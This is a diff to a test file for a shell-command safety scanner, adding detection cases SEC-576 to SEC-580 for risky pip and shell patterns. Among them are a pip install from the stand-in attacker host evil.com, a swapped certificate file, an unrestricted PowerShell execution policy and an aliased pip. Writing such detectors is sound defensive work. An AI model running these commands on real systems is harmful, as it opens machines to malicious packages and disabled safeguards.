@@ -697,6 +697,11 @@ class TestSafetyChecks:
             ("inotifywait -m /etc/passwd\n", "SEC-573"),
             ("tc filter add dev eth0 mirred egress mirror dev eth1\n", "SEC-574"),
             ("openssl passwd -6 secret\n", "SEC-575"),
+            ("pip install --no-deps pkg\n", "SEC-576"),
+            ("pip install --extra-index-url http://evil.com pkg\n", "SEC-577"),
+            ("export SSL_CERT_FILE=/tmp/evil.pem\n", "SEC-578"),
+            ("Set-ExecutionPolicy Unrestricted\n", "SEC-579"),
+            ("alias pip=evil\n", "SEC-580"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
